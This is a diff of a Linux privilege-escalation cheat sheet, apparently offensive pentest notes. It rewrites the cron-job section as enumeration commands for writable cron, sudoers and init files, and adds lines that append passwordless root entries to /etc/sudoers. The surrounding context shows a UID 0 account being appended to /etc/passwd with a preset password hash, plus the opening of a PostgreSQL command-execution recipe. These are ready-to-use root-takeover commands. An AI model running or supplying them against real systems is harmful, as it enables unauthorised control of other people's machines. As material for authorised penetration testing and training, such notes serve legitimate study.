@@ -471,33 +471,36 @@ screen(with suid) -ls # screen itself is setuid, so...
 #To completely remove the container from your system, you can use machinectl as follows
 kali@kali:sudo machinectl remove MACHINE_NAME
 ```
- ###### Cronjob to elevate privilege
- leverage the cron jobs run by root but current user can edit it to elevate privilege
- ```
- 1. Show Cronjobs logs:
-grep "CRON" /var/log/cron.log
-Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
+###### Cronjob to elevate privilege
+Check if you have access with write permission on these files.
+Check inside the file, to find other paths with write permissions.
+```
+/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d 
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+/etc/sudoers
+/etc/exports
+/etc/anacrontab
+/var/spool/cron
+/var/spool/cron/crontabs/root
 
-2. To display contents of the root user’s crontab:
-less /etc/crontab
-
-3. View Cron Jobs by User:
-sudo crontab -u [username] -l
-
-4. List Hourly/daily/weekly/monthly Cron Jobs:
-ls -la /etc/cron.hourly
-
-5. To view software specefic cron tasks:
-cd /etc/cron/daily
-ls -l
-
-6. To list all scheduled cron jobs for the current user:
 crontab -l
-
-7. Cron jobs are typically located in the spool directories.
-They are stored in tables called crontabs.
-You can find them in /var/spool/cron/crontabs
- ```
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
+```
 ###### Insecure file permission /etc/passwd
  ```
  1. check if users have write permission
@@ -507,6 +510,11 @@ openssl passwd -1 -salt hack password123
  3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
  4. su root2, enter passwd as evil
  ```
+###### Writable /etc/sudoers
+```
+echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+```
 ###### Postgresql to RCE
 ```
 To run system commands on Linux or Windows, we need to use the PROGRAM parameter. We start with creating a table; we can name — shell.
